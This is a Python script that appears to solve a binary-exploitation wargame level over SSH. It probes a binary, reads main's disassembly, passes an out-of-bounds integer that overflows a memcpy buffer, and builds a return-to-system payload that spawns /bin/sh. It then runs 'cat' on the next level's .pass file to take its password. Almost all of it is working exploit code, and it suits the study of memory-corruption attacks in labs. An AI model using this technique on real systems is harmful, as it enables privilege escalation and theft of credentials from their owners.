import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, find_offset, get_func_address, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string, PATTERN

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'./{binary_name}', title='Simple execute binary')
print_title('Segfault')

exec(client, f'./{binary_name} test', title='Simple execute binary')
print_title('Nothing happened')

exec(client, f'./{binary_name} test test', title='Simple execute binary')
print_title('Nothing happened')
print_title('Okay, 1+ args expected')
print_title('Debug time')

get_func_structure(
    client, 'main', title='Call memcpy (+79) - vulnerability point, '
                          'cmp arg with 0x574f4c46 (+84) '
                          'if passed call exec /bin/sh (0x8048583) (+117)')
shell_address = '0x8048583'

uint_out = -1073741803
print_title('Send out-of-bounds uint value to first arg and trash string to second to find buffer offset')
offset = find_offset(
    client, binary_name, pattern=f'{uint_out} {PATTERN}')

print_title('Find system func address')
system_address = get_func_address(client, 'system', binary_name=f'{binary_name} -ex "r"')
print_output(system_address, 'System address')

print_title('Build exploit: offset + system address + 4 byte offset (ret) + shell address')
f = lambda command: f'echo {command} | ./{binary_name} {uint_out} $(python -c \'print "." * {offset} + "{address_to_string(system_address)}" + ' \
                    f'"...." + "{address_to_string(shell_address)}"\')'

output = exec(client, f('whoami'), title='Check user')
print_output(output, 'Current user')
print_title('Broken!')

token = exec(client, f('cat /home/user/bonus2/.pass'), title='Steal the password')

save_token(token, client)
